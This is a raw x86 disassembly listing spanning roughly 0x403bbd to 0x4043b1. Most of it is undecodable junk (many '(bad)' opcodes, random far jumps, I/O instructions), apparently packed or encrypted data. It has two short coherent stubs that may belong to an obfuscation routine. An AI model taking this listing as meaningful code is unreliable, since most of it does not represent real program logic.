  403bbd:	outs   dx,DWORD PTR ds:[esi]
  403bbe:	lods   al,BYTE PTR ds:[esi]
  403bbf:	and    al,0x8c
  403bc1:	mov    edx,0xe8da3436
  403bc6:	sbb    bl,BYTE PTR [esi+0x36]
  403bc9:	adc    BYTE PTR [ebx],al
  403bcb:	jg     0x403bf3
  403bcd:	inc    esp
  403bce:	les    esi,FWORD PTR [ebx+0x381f762d]
  403bd4:	push   ds
  403bd5:	mov    ds,WORD PTR [edx]
  403bd7:	mov    edi,0xf8106e90
  403bdc:	neg    DWORD PTR [ebp-0x3a]
  403bdf:	mov    cl,0xaf
  403be1:	gs ret 0x167
  403be5:	mov    ah,0x6f
  403be7:	retf   
  403be8:	mov    ah,0xe5
  403bea:	(bad)  
  403bec:	enter  0x619b,0xc8
  403bf0:	mov    edx,0x8ef37db1
  403bf5:	adc    DWORD PTR [ebx+0x7c0aec0c],esi
  403bfb:	add    eax,0x1c820088
  403c00:	sub    eax,0x8b8c4e8f
  403c05:	dec    edx
  403c06:	cmp    eax,0x7a44462a
  403c0b:	add    BYTE PTR [eax-0x2],ah
  403c0e:	cwde   
  403c0f:	in     al,dx
  403c10:	jns    0x403c7c
  403c12:	pop    ss
  403c13:	mov    WORD PTR [ebx],cs
  403c15:	push   esi
  403c16:	sbb    edi,DWORD PTR [eax+0x617996f8]
  403c1c:	outs   dx,BYTE PTR ds:[esi]
  403c1d:	sub    dl,BYTE PTR [eax]
  403c1f:	fist   WORD PTR [ecx]
  403c21:	add    edx,esi
  403c23:	stos   BYTE PTR es:[edi],al
  403c24:	push   esi
  403c25:	xchg   esi,eax
  403c26:	es and al,bl
  403c29:	mov    WORD PTR [edi+0x4a1cffc5],cs
  403c2f:	jns    0x403bfd
  403c31:	(bad)  
  403c32:	in     al,dx
  403c33:	xor    al,0xb5
  403c35:	xchg   ebx,eax
  403c36:	(bad)  
  403c37:	(bad)  
  403c38:	jp     0x403bf7
  403c3a:	jbe    0x403cb1
  403c3c:	jle    0x403c32
  403c3e:	jbe    0x403c8e
  403c40:	jmp    0xd748:0xb6eb7137
  403c47:	sbb    bh,bl
  403c49:	sbb    eax,0x85ba1814
  403c4e:	test   al,0xdf
  403c50:	adc    BYTE PTR [esi+0x9],0x4
  403c54:	push   ds
  403c55:	adc    eax,0xca8a1ee5
  403c5a:	jle    0x403cd6
  403c5c:	rol    DWORD PTR [edi],cl
  403c5e:	inc    ebx
  403c5f:	xor    edx,ecx
  403c61:	sbb    BYTE PTR [ecx-0x52],al
  403c64:	scas   eax,DWORD PTR es:[edi]
  403c65:	jmp    0x2077:0xc6583d22
  403c6c:	ds in  al,0x3d
  403c6f:	inc    esp
  403c70:	mov    edx,DWORD PTR [ecx+ebx*1]
  403c73:	cmp    ebx,DWORD PTR [edx-0x20fdbb62]
  403c79:	dec    eax
  403c7a:	(bad)  
  403c7b:	cs jnp 0x403c91
  403c7e:	out    dx,eax
  403c7f:	add    al,0xc9
  403c82:	pop    ecx
  403c83:	cdq    
  403c84:	sahf   
  403c85:	dec    esp
  403c86:	push   ebp
  403c87:	call   0x55e5:0xca00c13
  403c8e:	ja     0x403c77
  403c90:	ja     0x403c3d
  403c92:	xchg   esp,eax
  403c93:	cmp    dl,BYTE PTR [ecx+0x7000c507]
  403c99:	stos   DWORD PTR es:[edi],eax
  403c9a:	je     0x403ca4
  403c9c:	mov    ch,0xa6
  403c9e:	scas   al,BYTE PTR es:[edi]
  403c9f:	pop    ss
  403ca0:	nop
  403ca1:	call   0x2dd1:0xd7a9a965
  403ca8:	sbb    BYTE PTR [ecx-0x39fb1a88],bl
  403cae:	pop    esi
  403caf:	cmc    
  403cb0:	and    DWORD PTR [edi+esi*2],esp
  403cb3:	fsub   QWORD PTR [eax-0x6e]
  403cb6:	push   cs
  403cb7:	add    BYTE PTR [ebp+0x633efbc6],dh
  403cbd:	inc    edx
  403cbe:	push   eax
  403cbf:	jp     0x403cc7
  403cc1:	cmc    
  403cc2:	ret    0x2e24
  403cc5:	pop    eax
  403cc6:	xor    eax,0xf7d7e2e
  403ccb:	nop
  403ccc:	sbb    eax,0xe1aa722b
  403cd1:	(bad)  
  403cd3:	mov    ah,0xf2
  403cd5:	test   BYTE PTR [ebx+0x6e],bh
  403cd8:	push   edi
  403cd9:	imul   edi,DWORD PTR [edx-0x2135c1e8],0x5
  403ce0:	lea    eax,[ebx]
  403ce2:	xor    eax,0xace394b1
  403ce7:	cli    
  403ce8:	test   bl,dh
  403cea:	loopne 0x403cf7
  403cec:	jp     0x403c75
  403cee:	pusha  
  403cef:	pop    ecx
  403cf0:	dec    eax
  403cf1:	retf   0xf49d
  403cf4:	sbb    BYTE PTR [esi],bh
  403cf6:	jns    0x403cfd
  403cf8:	xchg   ebx,eax
  403cf9:	mov    ecx,0x9d885509
  403cfe:	jnp    0x403d46
  403d00:	or     esp,DWORD PTR [ecx]
  403d02:	sbb    eax,ebx
  403d04:	call   0x95e94135
  403d09:	xchg   edx,eax
  403d0a:	test   al,0x42
  403d0c:	pop    ebp
  403d0d:	fs jl  0x403ca7
  403d10:	js     0x403cf3
  403d12:	or     eax,edi
  403d14:	ror    BYTE PTR [ebx-0x63],0x81
  403d18:	in     eax,0x3
  403d1a:	push   ebx
  403d1b:	mov    ds:0x9574d081,al
  403d20:	std    
  403d21:	das    
  403d22:	scas   al,BYTE PTR es:[edi]
  403d23:	fidivr DWORD PTR [eax-0x39]
  403d26:	push   edi
  403d27:	fimul  WORD PTR [eax+0x24b05190]
  403d2d:	(bad)  
  403d2e:	mov    al,0x56
  403d30:	test   eax,0xbc38ee6a
  403d35:	gs xchg edi,eax
  403d37:	add    dh,ch
  403d39:	dec    ebp
  403d3a:	push   edx
  403d3b:	and    ah,al
  403d3d:	mov    esi,0x9ef671d2
  403d42:	retf   
  403d43:	les    edi,FWORD PTR [esi-0x429b9bd6]
  403d49:	xor    edx,DWORD PTR [eax+0x53ad1a71]
  403d4f:	dec    eax
  403d50:	rep lods al,BYTE PTR ds:[esi]
  403d52:	mov    DWORD PTR [ebx],eax
  403d54:	(bad)  
  403d56:	sbb    eax,0x303dde26
  403d5b:	push   esp
  403d5c:	enter  0x97db,0xe7
  403d60:	mov    cl,0xf9
  403d62:	cmp    DWORD PTR [ebp-0x2],eax
  403d65:	cli    
  403d66:	mov    esi,0xff8ac1aa
  403d6b:	aad    0x9e
  403d6d:	or     eax,0x50108107
  403d72:	or     al,0xce
  403d74:	mov    ebx,0x3429d20
  403d79:	jno    0x403d19
  403d7b:	push   0xffffffca
  403d7d:	push   es
  403d7e:	pop    ecx
  403d7f:	test   BYTE PTR ss:[edx-0x111241ff],dl
  403d86:	and    eax,0x16e92794
  403d8b:	es sub al,0x97
  403d8e:	push   ss
  403d8f:	sub    bh,BYTE PTR [edx-0x194eee7d]
  403d95:	in     al,0x39
  403d97:	inc    edx
  403d98:	adc    edi,DWORD PTR [ecx]
  403d9a:	jo     0x403dc3
  403d9c:	test   al,0x92
  403d9e:	cmp    bl,BYTE PTR [edi+0x32ac891b]
  403da4:	int3   
  403da5:	shr    DWORD PTR [ebp+edx*1-0x6c],1
  403da9:	lds    edi,FWORD PTR [ebx-0x58ec610b]
  403daf:	or     al,0xdf
  403db1:	ins    BYTE PTR es:[edi],dx
  403db2:	xor    ecx,esp
  403db4:	jge    0x403d4a
  403db6:	cmp    eax,0x8552dfab
  403dbb:	cmc    
  403dbc:	xchg   edx,eax
  403dbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403dbe:	fdiv   QWORD PTR [ebp+edx*8-0x48efd630]
  403dc5:	aaa    
  403dc6:	sub    al,0x2f
  403dc8:	adc    BYTE PTR [eax+0x716250ba],bl
  403dce:	mov    ds:0x5c4bf718,al
  403dd3:	xchg   ebp,eax
  403dd4:	iret   
  403dd5:	hlt    
  403dd6:	addr16 xchg esp,eax
  403dd8:	push   esi
  403dd9:	sbb    eax,0x489aef53
  403dde:	and    BYTE PTR [ebx-0x42022352],0xd3
  403de5:	sub    al,0xbb
  403de7:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  403de9:	mov    ch,0x4f
  403deb:	pop    esi
  403dec:	mov    ah,BYTE PTR [edx]
  403dee:	inc    edi
  403def:	inc    ebx
  403df0:	loope  0x403e45
  403df2:	aad    0x3
  403df4:	mov    bl,0xcd
  403df6:	or     ch,bh
  403df8:	(bad)  
  403df9:	clc    
  403dfa:	mov    dh,0x64
  403dfc:	adc    DWORD PTR [edi],ecx
  403dfe:	inc    esp
  403dff:	push   ebx
  403e00:	(bad)  
  403e01:	jp     0x403e13
  403e03:	out    dx,al
  403e04:	jo     0x403dca
  403e06:	popa   
  403e07:	cmp    esi,ebp
  403e09:	cmp    ax,0x7c
  403e0d:	push   esp
  403e0e:	sub    ah,BYTE PTR [eax+eax*1+0x31]
  403e12:	mov    esp,0x68384c3d
  403e17:	int    0xb1
  403e19:	fdiv   QWORD PTR [edi+ebx*2]
  403e1c:	daa    
  403e1d:	aad    0xf0
  403e1f:	pusha  
  403e20:	cli    
  403e21:	(bad)  
  403e22:	repz aaa 
  403e24:	xchg   edi,eax
  403e25:	push   es
  403e26:	fisttp QWORD PTR ds:0x5c212f64
  403e2c:	test   BYTE PTR [ecx+0x3e],dl
  403e2f:	mov    esp,0x97c02e73
  403e34:	jmp    0x403e14
  403e36:	fwait
  403e37:	or     eax,0x6e8ce7ec
  403e3c:	aam    0x48
  403e3e:	hlt    
  403e3f:	dec    ebx
  403e40:	jge    0x403e0b
  403e42:	sbb    al,0x2e
  403e44:	jo     0x403e49
  403e46:	mov    esp,0x3e6f0a0a
  403e4b:	mov    BYTE PTR [esi],dl
  403e4d:	outs   dx,BYTE PTR ds:[esi]
  403e4e:	pop    esp
  403e4f:	mov    ebp,0x2e6a72eb
  403e54:	pop    ebp
  403e55:	in     eax,dx
  403e56:	push   ebp
  403e57:	shl    DWORD PTR [esi-0x264fb072],0x46
  403e5e:	mov    ebx,0xa90eeaca
  403e63:	or     BYTE PTR [edi-0x57c04a81],al
  403e69:	(bad)  
  403e6a:	repz ret 0x8112
  403e6e:	mov    al,0x40
  403e70:	mov    esp,0x8d238399
  403e75:	pop    ss
  403e76:	mov    bl,0xb7
  403e78:	push   ds
  403e79:	dec    esi
  403e7a:	out    0xef,al
  403e7c:	sbb    BYTE PTR [ebp+0x24189c40],cl
  403e82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e83:	cmp    al,0xae
  403e85:	iret   
  403e86:	pop    eax
  403e87:	cmp    eax,0xd1d43992
  403e8c:	or     esi,ebx
  403e8e:	sti    
  403e8f:	mov    dh,0xb
  403e91:	mov    al,0x2a
  403e93:	stos   BYTE PTR es:[edi],al
  403e94:	push   0x61197f79
  403e99:	lods   eax,DWORD PTR ds:[esi]
  403e9a:	or     al,0x90
  403e9c:	mov    edx,0x82de58e1
  403ea1:	xor    al,0x15
  403ea3:	test   eax,0xafc78be2
  403ea8:	jge    0x403ef6
  403eaa:	das    
  403eab:	mov    bh,0x42
  403ead:	psubb  mm5,mm4
  403eb0:	scas   eax,DWORD PTR es:[edi]
  403eb1:	hlt    
  403eb2:	sub    eax,DWORD PTR [edi+0x20ca0456]
  403eb8:	scas   eax,DWORD PTR es:[edi]
  403eb9:	sub    bh,dl
  403ebb:	mov    esi,0x2ccf170a
  403ec0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ec1:	or     al,0x2b
  403ec3:	dec    BYTE PTR [edx]
  403ec5:	pop    ss
  403ec6:	adc    eax,0x8db01246
  403ecb:	xchg   edx,eax
  403ecc:	push   esp
  403ecd:	xchg   esp,eax
  403ece:	jmp    0x62ba:0x314e9096
  403ed5:	sub    BYTE PTR [ebx-0x34],bl
  403ed8:	ja     0x403ec7
  403eda:	jmp    0x32e259b8
  403edf:	(bad)  
  403ee0:	sti    
  403ee1:	cwde   
  403ee2:	add    eax,0x72b47ff4
  403ee7:	jmp    0x9fdfdcee
  403eec:	pop    eax
  403eed:	push   esi
  403eee:	ret    0xc4e6
  403ef1:	sub    edi,ecx
  403ef3:	cmp    DWORD PTR [ebx+0xc],ebx
  403ef6:	cmp    bh,ch
  403ef8:	test   al,0x8a
  403efa:	fldcw  WORD PTR [ebp+eiz*2-0x38]
  403efe:	ret    
  403eff:	inc    esi
  403f00:	aad    0x87
  403f02:	push   ebx
  403f03:	add    edx,DWORD PTR [ecx-0x7bfa6198]
  403f09:	pop    edx
  403f0a:	ins    DWORD PTR es:[edi],dx
  403f0b:	add    eax,DWORD PTR [ecx]
  403f0d:	sbb    DWORD PTR ds:0x4281cf,ebx
  403f13:	mov    DWORD PTR [ebp-0x14],eax
  403f16:	mov    ecx,DWORD PTR [ebx]
  403f18:	mov    eax,DWORD PTR [ebx+0x4]
  403f1b:	mov    edx,DWORD PTR ds:0x42824f
  403f21:	mov    edx,DWORD PTR [edx]
  403f23:	add    DWORD PTR ds:0x4283db,edx
  403f29:	shrd   ecx,eax,0x2
  403f2d:	sub    edx,0x9bd
  403f33:	shr    eax,0x2
  403f36:	and    eax,eax
  403f38:	mov    eax,DWORD PTR [ebx]
  403f3a:	and    DWORD PTR ds:0x428297,0x5c10
  403f44:	jmp    0x404322
  403f49:	sub    DWORD PTR [ecx-0x65e52424],0xffffff82
  403f50:	and    esi,esi
  403f52:	sbb    BYTE PTR [ecx-0x11fb0c44],ch
  403f58:	mov    esi,0x1818d7ce
  403f5d:	sahf   
  403f5e:	adc    bl,BYTE PTR [eax]
  403f60:	sbb    BYTE PTR [eax-0x50],bl
  403f63:	jne    0x403f5d
  403f65:	test   BYTE PTR [ecx-0x574a1437],ch
  403f6b:	stos   BYTE PTR es:[edi],al
  403f6c:	adc    edi,esp
  403f6e:	(bad)  
  403f70:	outs   dx,DWORD PTR ds:[esi]
  403f71:	pop    edx
  403f72:	repz dec ecx
  403f74:	js     0x403fe3
  403f76:	sahf   
  403f77:	adc    edi,esp
  403f79:	mov    ah,0xd2
  403f7b:	aad    0x45
  403f7d:	scas   eax,DWORD PTR es:[edi]
  403f7e:	fdiv   QWORD PTR [ecx-0x1f809b94]
  403f84:	outs   dx,BYTE PTR ds:[esi]
  403f85:	cdq    
  403f86:	(bad)  
  403f87:	ss mov bl,0xf
  403f8a:	test   BYTE PTR [edi-0x4a],ch
  403f8d:	shl    DWORD PTR [ebp-0x59123d38],0xa7
  403f94:	cwde   
  403f95:	fwait
  403f96:	aam    0xa9
  403f98:	xchg   ebp,eax
  403f99:	jg     0x403f55
  403f9b:	movhps xmm6,QWORD PTR [esi+0x7b]
  403f9f:	pop    es
  403fa0:	pop    ebp
  403fa1:	mov    ch,bl
  403fa3:	jp     0x403fcd
  403fa5:	adc    eax,0x54ff241
  403faa:	cwde   
  403fab:	cmp    eax,0xdb059dd1
  403fb0:	sbb    eax,0xafe7b133
  403fb5:	xchg   ebp,eax
  403fb6:	repnz sbb eax,0xe6128266
  403fbc:	test   DWORD PTR [esi+0x7c57960e],eax
  403fc2:	fwait
  403fc3:	adc    edi,edx
  403fc5:	inc    ebp
  403fc6:	lods   al,BYTE PTR ds:[esi]
  403fc7:	jo     0x40402d
  403fc9:	(bad)  
  403fca:	out    dx,al
  403fcb:	mov    edi,0x91943084
  403fd0:	mov    bh,0xc3
  403fd2:	dec    edx
  403fd3:	jg     0x404046
  403fd5:	or     dl,BYTE PTR [ebx]
  403fd7:	push   esp
  403fd8:	sahf   
  403fd9:	pop    ebx
  403fda:	and    eax,0x3779d7a1
  403fdf:	dec    esp
  403fe0:	and    BYTE PTR [esi-0x4d],bl
  403fe3:	into   
  403fe4:	sbb    BYTE PTR [edx-0x54355725],cl
  403fea:	or     BYTE PTR [ebp-0x4b],0x9
  403fee:	fdiv   st(3),st
  403ff0:	add    ch,ch
  403ff2:	jnp    0x403fa2
  403ff4:	cwde   
  403ff5:	imul   eax,DWORD PTR [esi+0x3a90ba93],0x5db91557
  403fff:	sbb    BYTE PTR [esi-0x65],0xaa
  404003:	sbb    al,BYTE PTR [ecx+0x44b4660c]
  404009:	add    al,0xda
  40400b:	inc    ebp
  40400c:	cmp    dh,BYTE PTR [ecx+0x18c69994]
  404012:	fistp  WORD PTR [edi-0x6c]
  404015:	div    DWORD PTR [esi+0x2c37c793]
  40401b:	ror    BYTE PTR [edi+0x6],0x7b
  40401f:	int    0x97
  404021:	jne    0x403fe3
  404023:	cli    
  404024:	mov    ch,0x8d
  404026:	dec    edx
  404027:	push   ss
  404028:	push   edx
  404029:	inc    ecx
  40402a:	lea    esp,[ebp-0x1d2aa224]
  404030:	rol    DWORD PTR [ebp-0x110c62bd],1
  404036:	or     ebp,DWORD PTR [ecx+0x160382f1]
  40403c:	das    
  40403d:	repnz mov dh,0x5f
  404040:	inc    edi
  404041:	cmp    eax,0xb1a4dc24
  404046:	pop    edi
  404047:	pop    eax
  404048:	nop
  404049:	xchg   ebp,eax
  40404a:	push   cs
  40404b:	aam    0x65
  40404d:	jl     0x404085
  40404f:	mov    edi,0x13387c1f
  404054:	or     edi,eax
  404056:	cmc    
  404057:	sub    DWORD PTR [ecx-0x2f4d2b1b],ebx
  40405d:	scas   eax,DWORD PTR es:[edi]
  40405e:	dec    ecx
  40405f:	int3   
  404060:	add    bl,ah
  404062:	dec    eax
  404063:	inc    esi
  404064:	cs cmp al,0xc2
  404067:	imul   ebx,DWORD PTR [ecx+0x5ae77aa5],0xffffff82
  40406e:	ret    
  40406f:	mov    ecx,?
  404071:	dec    esp
  404072:	xchg   ebx,esi
  404074:	mov    dh,0xca
  404076:	jg     0x4040ec
  404078:	pop    ds
  404079:	add    edi,ebx
  40407b:	push   cs
  40407c:	or     eax,0x56eadf2
  404081:	cmc    
  404082:	xor    DWORD PTR [edi+0x6c200653],ebp
  404088:	fwait
  404089:	sub    ch,cl
  40408b:	push   0xfffffff2
  40408d:	add    ebx,DWORD PTR [ecx+0x17]
  404090:	mov    ch,0x9b
  404092:	mov    ch,0x13
  404094:	jle    0x404036
  404096:	dec    esp
  404097:	jmp    0x40410a
  404099:	add    BYTE PTR [ecx],ch
  40409b:	add    ebp,esi
  40409d:	mov    esi,0x4248f4f2
  4040a2:	xchg   esp,eax
  4040a3:	cwde   
  4040a4:	js     0x4040dd
  4040a6:	or     al,0x3d
  4040a8:	aaa    
  4040a9:	cld    
  4040aa:	out    0xa4,eax
  4040ac:	aad    0xaa
  4040ae:	or     BYTE PTR [ecx+0x7442add1],0xc7
  4040b5:	jne    0x40407f
  4040b7:	hlt    
  4040b8:	inc    ecx
  4040b9:	aad    0xb2
  4040bb:	sti    
  4040bc:	cmp    DWORD PTR [edi],ebx
  4040be:	jge    0x4040b9
  4040c0:	sar    BYTE PTR [ebp-0x54],1
  4040c3:	xchg   edx,eax
  4040c4:	adc    BYTE PTR [ebp+0xd09964d],ah
  4040ca:	mov    cs,WORD PTR [eax]
  4040cc:	cmp    eax,0x82926003
  4040d1:	dec    ecx
  4040d2:	cmc    
  4040d3:	mov    ds:0xbe62036e,al
  4040d8:	jmp    0x2414:0x58aed1a5
  4040df:	dec    ebx
  4040e0:	xchg   ecx,eax
  4040e1:	xchg   ecx,eax
  4040e2:	inc    esi
  4040e3:	gs xchg ecx,eax
  4040e5:	test   BYTE PTR [eax+0x50],cl
  4040e8:	and    ch,BYTE PTR [edi]
  4040ea:	je     0x40408b
  4040ec:	pop    ebx
  4040ed:	fld    QWORD PTR [edx+eiz*2-0x74]
  4040f1:	xor    DWORD PTR [eax],ebx
  4040f3:	pop    es
  4040f4:	xor    BYTE PTR [ebx],cl
  4040f6:	inc    eax
  4040f7:	mov    BYTE PTR [edx+esi*2],dh
  4040fa:	dec    esi
  4040fb:	fsub   DWORD PTR [ecx]
  4040fd:	fnsave [edi]
  4040ff:	pop    esi
  404100:	xor    eax,0x1b9a60f3
  404105:	and    eax,0xfc9fd43c
  40410a:	or     ebp,DWORD PTR [ecx-0x43d65de4]
  404110:	xor    ebx,DWORD PTR [esi-0x39]
  404113:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404114:	in     eax,dx
  404115:	adc    eax,0xf1b06244
  40411a:	ret    0x80fc
  40411d:	inc    edx
  40411e:	ja     0x404141
  404120:	sbb    bl,bh
  404122:	mov    ebx,0x5fbd5d97
  404127:	sub    eax,0x7529ef3d
  40412c:	fdivp  st(7),st
  40412e:	stos   BYTE PTR es:[edi],al
  40412f:	add    BYTE PTR [eax+0x432e89cb],0x46
  404136:	add    eax,0x6175d536
  40413b:	fbstp  TBYTE PTR [esi+0x59]
  40413e:	in     al,0x9a
  404140:	or     ebx,DWORD PTR [ebp-0x1079ad9d]
  404146:	nop
  404147:	ret    
  404148:	xor    edx,DWORD PTR [ebp-0x509aaac1]
  40414e:	add    DWORD PTR [ebx+ecx*2+0x39acee05],ebx
  404155:	test   al,0x58
  404157:	cwde   
  404158:	jmp    0x73b1:0x4032d6b6
  40415f:	stc    
  404160:	hlt    
  404161:	ds (bad) 
  404163:	sahf   
  404164:	das    
  404165:	add    DWORD PTR [edi],0x43fdfc48
  40416b:	pop    eax
  40416c:	mov    ds:0xdfe5970b,al
  404171:	sbb    dh,BYTE PTR [ebp+0x7d]
  404174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404175:	xor    BYTE PTR [esi],ah
  404177:	inc    ebp
  404178:	push   esi
  404179:	add    DWORD PTR [ecx+ebp*8],edi
  40417c:	sub    dl,BYTE PTR [edi]
  40417e:	push   ss
  40417f:	or     dl,BYTE PTR [esi+0xc]
  404182:	mov    ds:0xe244d5d8,eax
  404187:	xor    eax,0xe27ed765
  40418c:	mov    BYTE PTR [ebx],0x44
  40418f:	ror    bl,1
  404191:	imul   esp,DWORD PTR [eax-0x80]
  404195:	pop    eax
  404196:	push   ds
  404197:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404198:	enter  0xe4e1,0xe2
  40419c:	xchg   edi,eax
  40419d:	pop    es
  40419e:	rol    DWORD PTR es:[ebx],0xb3
  4041a2:	cwde   
  4041a3:	mov    ch,0x81
  4041a5:	sar    DWORD PTR [ebx-0x4ea27376],1
  4041ab:	scas   al,BYTE PTR es:[edi]
  4041ac:	adc    DWORD PTR [ebx-0x56],esp
  4041af:	(bad)  
  4041b0:	sar    BYTE PTR [edi+0x6d109f83],1
  4041b6:	(bad)  
  4041b7:	xor    al,ch
  4041b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041ba:	add    eax,0xd4394a3c
  4041bf:	mov    bl,0x23
  4041c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041c2:	scas   eax,DWORD PTR es:[edi]
  4041c3:	pop    ss
  4041c4:	out    dx,al
  4041c5:	and    BYTE PTR [eax-0x2837b1bb],0x8a
  4041cc:	push   esi
  4041cd:	call   0x9dcdfe9e
  4041d2:	pop    es
  4041d3:	(bad)  
  4041d4:	test   al,0x28
  4041d6:	je     0x404211
  4041d8:	ins    BYTE PTR es:[edi],dx
  4041d9:	adc    bl,ah
  4041db:	pop    esi
  4041dc:	es pop esi
  4041de:	push   ebx
  4041df:	push   cs
  4041e0:	adc    al,0x14
  4041e2:	sub    eax,0xb2a07fb3
  4041e7:	mov    ecx,0x719eff2e
  4041ec:	scas   eax,DWORD PTR es:[edi]
  4041ed:	or     dl,BYTE PTR [ebp-0x22724092]
  4041f3:	ins    BYTE PTR es:[edi],dx
  4041f4:	jmp    0x404232
  4041f6:	dec    edi
  4041f7:	cmp    esp,DWORD PTR [edx+0x20e7f98d]
  4041fd:	push   ds
  4041fe:	popa   
  4041ff:	icebp  
  404200:	xor    al,0xbf
  404202:	adc    eax,0xd2919d6f
  404207:	std    
  404208:	jno    0x404207
  40420a:	fwait
  40420b:	push   ecx
  40420c:	ins    DWORD PTR es:[edi],dx
  40420d:	call   0x8ab5bba3
  404212:	jne    0x404269
  404214:	push   es
  404215:	addps  xmm2,xmm2
  404218:	adc    BYTE PTR [eax+eiz*1+0x7e],dh
  40421c:	pop    ds
  40421d:	das    
  40421e:	cmc    
  40421f:	mov    esp,0xdfca53f5
  404224:	xchg   ecx,eax
  404225:	inc    ebx
  404226:	aaa    
  404227:	add    al,0x52
  404229:	mov    esp,0x3b0a5529
  40422e:	iret   
  40422f:	in     al,0x82
  404231:	test   al,0x4d
  404233:	push   es
  404234:	and    al,0x95
  404236:	fnstenv [eax+0x45a31f0]
  40423c:	inc    eax
  40423d:	push   ebx
  40423e:	nop
  40423f:	fwait
  404240:	ss jne 0x404256
  404243:	(bad)  
  404244:	fidivr DWORD PTR [edi-0x41]
  404247:	lock fsub st,st(4)
  40424a:	dec    ecx
  40424b:	jbe    0x4042b4
  40424d:	push   edx
  40424e:	inc    edi
  40424f:	mov    al,0x7d
  404251:	bound  ecx,QWORD PTR [eax+eax*1]
  404254:	mov    al,0x55
  404256:	xchg   edi,eax
  404257:	push   esp
  404258:	jge    0x4042d7
  40425a:	fiadd  WORD PTR [edi-0x78]
  40425d:	ins    DWORD PTR es:[edi],dx
  40425e:	nop
  40425f:	push   cs
  404260:	xchg   ebx,eax
  404261:	or     ebp,edx
  404263:	int3   
  404264:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404265:	dec    ax
  404267:	or     eax,0xbff3de18
  40426c:	push   ss
  40426d:	jno    0x404271
  40426f:	aad    0xe4
  404271:	xlat   BYTE PTR ds:[ebx]
  404272:	pmaxsw mm5,QWORD PTR [edx-0x5e]
  404276:	(bad)  
  404277:	or     cl,dh
  404279:	(bad)  
  40427a:	mov    bh,0xab
  40427c:	fld    TBYTE PTR [eax-0x1f872daa]
  404282:	sbb    al,0x48
  404284:	in     eax,dx
  404285:	push   ds
  404286:	push   ebx
  404287:	aaa    
  404288:	adc    eax,0xc1066ec9
  40428d:	repz mov ebp,0x2f1b4677
  404293:	xlat   BYTE PTR ds:[ebx]
  404294:	mov    esi,0x4e63dfd
  404299:	rol    BYTE PTR [ecx],0x68
  40429c:	lods   al,BYTE PTR ds:[esi]
  40429d:	mov    cl,0x9c
  40429f:	sbb    BYTE PTR [eax],bh
  4042a1:	in     al,dx
  4042a2:	int    0x8f
  4042a4:	cmp    DWORD PTR [esi-0x52152339],0xd17de259
  4042ae:	je     0x4042d3
  4042b0:	pop    ebx
  4042b1:	add    eax,0x7448fa76
  4042b6:	and    BYTE PTR ds:0x8cd0069b,al
  4042bc:	pop    ss
  4042bd:	dec    esp
  4042be:	adc    esp,DWORD PTR [esi+0x64]
  4042c1:	adc    BYTE PTR [ebx-0x3f7d3dbf],dh
  4042c7:	pushf  
  4042c8:	call   0x1091:0x6206
  4042ce:	(bad)  
  4042d0:	cmp    al,BYTE PTR [eax+0xff3cd5b]
  4042d6:	xchg   BYTE PTR [edi+0x35bc9432],al
  4042dc:	aas    
  4042dd:	and    eax,0x1a012b8e
  4042e2:	jge    0x40428a
  4042e4:	or     DWORD PTR [edx+0x2],ebx
  4042e7:	mov    eax,esp
  4042e9:	mov    ds:0xb8647527,eax
  4042ee:	int    0xaa
  4042f0:	in     al,dx
  4042f1:	dec    eax
  4042f2:	fdivrp st(3),st
  4042f4:	xor    BYTE PTR gs:[ebx],cl
  4042f7:	adc    DWORD PTR [edx],ebx
  4042f9:	mov    ebp,0xcf73ba73
  4042fe:	fst    QWORD PTR [edi-0x21d42fe0]
  404304:	or     BYTE PTR [ecx],cl
  404306:	outs   dx,BYTE PTR ds:[esi]
  404307:	icebp  
  404308:	enter  0x1858,0xb0
  40430c:	in     eax,dx
  40430d:	adc    esp,DWORD PTR [ecx]
  40430f:	neg    esi
  404311:	stc    
  404312:	push   es
  404313:	(bad)  
  404314:	das    
  404315:	dec    BYTE PTR [ebx]
  404317:	push   0x519ebc13
  40431c:	aaa    
  40431d:	cmc    
  40431e:	cmp    ecx,esi
  404320:	jmp    0x493ceda
  404325:	and    DWORD PTR ds:0x42829b,ebx
  40432b:	xor    ecx,edi
  40432d:	or     edx,DWORD PTR ds:0x4282cb
  404333:	shl    eax,0x1e
  404336:	and    edx,DWORD PTR ds:0x428347
  40433c:	xor    eax,eax
  40433e:	mov    edx,DWORD PTR ds:0x428287
  404344:	and    DWORD PTR ds:0x4283e7,edx
  40434a:	or     eax,ecx
  40434c:	mov    ecx,DWORD PTR [ebx]
  40434e:	movzx  edx,BYTE PTR ds:0x4283cf
  404355:	sbb    DWORD PTR ds:0x4282db,edx
  40435b:	mov    edx,DWORD PTR [ebx+0x4]
  40435e:	jmp    0x40473c
  404363:	xchg   BYTE PTR [eax+ebp*4],ch
  404366:	xchg   edx,eax
  404367:	call   0x1412:0x951c227a
  40436e:	stos   BYTE PTR es:[edi],al
  40436f:	xchg   ecx,eax
  404370:	adc    al,0xbf
  404372:	mov    al,0x55
  404374:	iret   
  404375:	sbb    BYTE PTR [eax],bl
  404377:	sahf   
  404378:	adc    bl,BYTE PTR [eax]
  40437a:	sbb    BYTE PTR [eax-0x7ce4b16],ah
  404380:	iret   
  404381:	outs   dx,BYTE PTR ds:[esi]
  404382:	add    bl,BYTE PTR [ebx+0x7c]
  404385:	add    bl,BYTE PTR [ebp+0x9ef1276]
  40438b:	mov    bl,0x45
  40438d:	add    edi,esi
  40438f:	mov    ebp,0x8c528b95
  404394:	(bad)  
  404395:	xor    eax,DWORD PTR ds:0xaee8cac2
  40439b:	adc    eax,0xc038e33e
  4043a0:	lods   eax,DWORD PTR ds:[esi]
  4043a1:	fstp   DWORD PTR [edi+esi*2+0x1d]
  4043a5:	pop    esp
  4043a6:	push   ebx
  4043a7:	add    DWORD PTR [ecx-0x74],0xffffff91
  4043ab:	mov    bh,0x58
  4043ad:	pop    es
  4043ae:	sbb    DWORD PTR [eax],ecx
  4043b0:	pop    eax
  4043b1:	push   es
